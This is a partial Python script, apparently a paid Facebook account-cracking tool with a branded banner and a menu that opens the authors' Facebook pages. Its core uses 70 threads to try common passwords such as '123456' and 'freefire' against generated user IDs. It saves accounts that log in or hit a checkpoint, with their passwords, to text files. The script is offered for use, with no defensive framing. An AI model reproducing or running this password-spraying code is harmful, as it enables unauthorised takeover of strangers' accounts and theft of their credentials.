...
\33[1;37m----------------------------------------------
→   Owner      :  SRABON & MOTU TRICKER
→   Facebook   :  FROGNET SRABON
→   Github     :  F3ogbaba03
→   Tool Type  :  \x1b[1;95mPAID
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://facebook.com/srabon.sheikh.522')
	if riaz1 =='4':
		os.system('xdg-open https://facebook.com/groups/2119520291512409/');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'freefire','bangladish','123456']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SRABON-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SRABON-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SRABON-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('SRABON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSRABON_X_MOTU\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
